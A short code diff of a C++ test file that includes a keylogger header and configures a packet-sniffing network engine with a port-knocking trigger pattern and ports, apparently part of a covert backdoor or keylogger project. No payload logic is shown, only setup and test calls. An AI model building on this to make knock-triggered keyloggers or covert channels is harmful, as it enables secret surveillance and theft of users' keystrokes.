@@ -12,7 +12,11 @@
 
 #include "Keylogger.h"
 
-const char *interfaceName = "wlp59s0";
+const std::string interfaceName("wlp59s0");
+const std::string knockPattern("8000,8001,8002");
+
+const unsigned short knockPort = 42069;
+const unsigned int knockDuration = 5;
 
 const short sport = 42069;
 const short dport = 7575;
@@ -44,7 +48,7 @@ void testNet() {
     srcAddr.s_addr = 0xDEADBEEF;
     dstAddr.s_addr = 0xEFBEADDE;
 
-    NetworkEngine netEngine(interfaceName);
+    NetworkEngine netEngine(interfaceName, knockPattern, knockPort, knockDuration);
 
     // tcp sending examples
     for (int i = 0; i < 10; i++) {
@@ -73,14 +77,14 @@ void testNet() {
 
     // example of starting and stopping sniffing
     std::cout << "starting sniff" << std::endl;
-    netEngine.startSniff(NetworkEngine::IP_FILTER);
+    netEngine.startSniff("ip");
     sleep(2);
     std::cout << "stopping sniff" << std::endl;
     netEngine.stopSniff();
 }
 
 void testKnock() {
-    NetworkEngine netEngine(interfaceName);
+    NetworkEngine netEngine(interfaceName, knockPattern, knockPort, knockDuration);
     char *dottedDecimalString = inet_ntoa(*netEngine.getIp());
     // std::string pcapFilter("ip and udp and dst host " + std::string(dottedDecimalString));
     std::string pcapFilter("ip and udp");
